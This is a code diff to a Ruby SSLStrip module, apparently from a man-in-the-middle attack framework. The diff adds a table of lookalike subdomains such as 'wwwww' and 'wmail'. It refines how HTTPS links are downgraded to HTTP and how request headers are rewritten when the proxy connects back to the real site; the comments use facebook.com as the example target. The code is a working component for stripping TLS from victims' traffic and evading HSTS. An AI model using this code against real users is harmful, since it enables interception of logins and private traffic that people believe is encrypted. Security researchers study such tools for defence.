@@ -17,9 +17,19 @@ module SSLStrip
 
 # Represent a stripped url associated to the client that requested it.
 class StrippedObject
+  # The stripped request client address.
   attr_accessor :client
+  # The original URL.
   attr_accessor :original
+  # The stripped version of the URL.
   attr_accessor :stripped
+
+  # Known subdomains to replace.
+  SUBDOMAIN_REPLACES = {
+    'www'     => 'wwwww',
+    'webmail' => 'wwebmail',
+    'mail'    => 'wmail'
+  }.freeze
 
   # Create an instance with the given arguments.
   def initialize( client, original, stripped )
@@ -30,9 +40,11 @@ class StrippedObject
 
   # Return a normalized version of +url+.
   def self.normalize( url, schema = 'https' )
+    # add schema if needed
     unless url.include?('://')
       url = "#{schema}://#{url}"
     end
+    # add path if needed
     unless url.end_with?('/')
       url = "#{url}/"
     end
@@ -42,12 +54,20 @@ class StrippedObject
   # Downgrade +url+ from HTTPS to HTTP.
   # Will take care of HSTS bypass urls in a near future.
   def self.strip( url )
+    # first thing first, downgrade the protocol schema
     stripped = url.gsub( 'https://', 'http://' )
-
-    if stripped.include?('www.')
-      stripped = stripped.gsub( 'www.', 'wwwww.' )
-    else
-      stripped = stripped.gsub( '://', '://wwwww.' )
+    # search for a known subdomain and replace it
+    found = false
+    SUBDOMAIN_REPLACES.each do |from,to|
+      if stripped.include?( "://#{from}." )
+        stripped = stripped.gsub( "://#{from}.", "://#{to}." )
+        found = true
+        break
+      end
+    end
+    # fallback, prepend custom 'wwwww.'
+    unless found
+      stripped.gsub!( '://', '://wwwww.' )
     end
 
     Logger.debug  "[#{'SSLSTRIP'.green} '#{url}' -> '#{stripped}'"
@@ -149,11 +169,21 @@ class Strip
   # proxy it via SSL.
   def process_stripped!(request)
     if request.port == 80 and was_stripped?(request)
-      url        = StrippedObject.normalize( request['Host'], 'http' )
+      # i.e: wwww.facebook.com
+      stripped   = request['Host']
+      # i.e: http://wwww.facebook.com/
+      url        = StrippedObject.normalize( stripped, 'http' )
+      # i.e: www.facebook.com
       unstripped = unstrip( request, url ).gsub( 'https://', '' ).gsub('/', '' )
 
-      request['Host'] = unstripped
-      request.port    = 443
+      # loop each header and fix the stripped url if needed,
+      # this will fix headers such as Host, Referer, Origin, etc.
+      request.headers.each do |name,value|
+        if value.include?(stripped)
+          request[name] = value.gsub( stripped, unstripped ).gsub( 'http://', 'https://')
+        end
+      end
+      request.port = 443
 
       Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{url}', proxying via SSL ( #{request.to_url} )."
     end
